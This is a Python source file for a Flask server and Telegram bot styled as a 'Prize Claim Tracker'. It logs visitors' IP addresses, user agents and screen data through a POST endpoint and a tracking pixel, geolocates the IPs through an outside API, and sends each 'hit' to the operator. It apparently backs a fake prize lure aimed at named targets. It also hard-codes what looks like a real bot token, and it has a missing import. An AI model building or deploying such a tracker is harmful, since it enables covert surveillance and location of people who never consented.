# 🔥 PASTE YOUR TELEGRAM BOT TOKEN HERE 🔥
BOT_TOKEN = "8666051181:AAEAm9fcoJEV1bMsGsRrwleNsFU0XUC1RtY"

import logging
from flask import Flask, request
from telegram import Bot
from telegram.ext import Application
import threading, json, requests, time
from collections import defaultdict
import geocoder

app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)
captures = defaultdict(list)
chat_id = None  # Your Telegram chat ID

# IP to Location Cache
def get_location(ip):
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3).json()
        return f"{resp.get('city', 'Unknown')}, {resp.get('region', '')}, {resp.get('country_name', '')} | {resp.get('latitude')}, {resp.get('longitude')}"
    except: return "Unknown"

@app.route('/log', methods=['POST'])
def log_data():
    try:
        data = request.data.decode()
        info = json.loads(data)
        
        capture = f"🎯 NEW HIT:\n"
        capture += f"📍 IP: `{info.get('ip', 'Unknown')}`\n"
        capture += f"🗺️  Loc: {get_location(info.get('ip', ''))}\n"
        capture += f"🌐 UA: {info.get('ua', '')[:60]}...\n"
        capture += f"📱 Screen: {info.get('screen', 'Unknown')}\n"
        capture += f"🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        capture += f"🔗 URL: https://ipinfo.io/{info.get('ip')}#location\n\n"
        
        captures[info.get('ip', 'unknown')].append(capture)
        
        if chat_id:
            bot.send_message(chat_id=chat_id, text=capture, parse_mode='Markdown')
        
        return '', 200
    except:
        return '', 200

@app.route('/claim', methods=['POST'])
def claim():
    bot.send_message(chat_id=chat_id, text="💥 CLAIM BUTTON CLICKED! High value target!", parse_mode='Markdown')
    return '', 200

@app.route('/tracker.gif')
def tracker_pixel():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    loc = get_location(ip)
    bot.send_message(chat_id=chat_id, text=f"📸 PIXEL HIT: {ip} | {loc}", parse_mode='Markdown')
    return app.send_static_file('pixel.gif')

# Telegram Bot Commands
async def start(update, context):
    global chat_id
    chat_id = update.effective_chat.id
    await update.message.reply_text("🚀 Prize Claim Tracker Active!\nSend targets /target @username\nLive dashboard: /stats")

async def stats(update, context):
    if captures:
        msg = "📊 LIVE CAPTURES:\n\n"
        for ip, logs in list(captures.items())[-5:]:
            msg += logs[-1]
        await update.message.reply_text(msg, parse_mode='Markdown')
    else:
        await update.message.reply_text("No captures yet...")

if __name__ == '__main__':
    # Start Telegram Bot
    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("stats", stats))
    
    threading.Thread(target=app_bot.run_polling, daemon=True).start()
    
    # Start Flask (GitHub Pages proxy via webhook)
    app.run(host='0.0.0.0', port=8080)
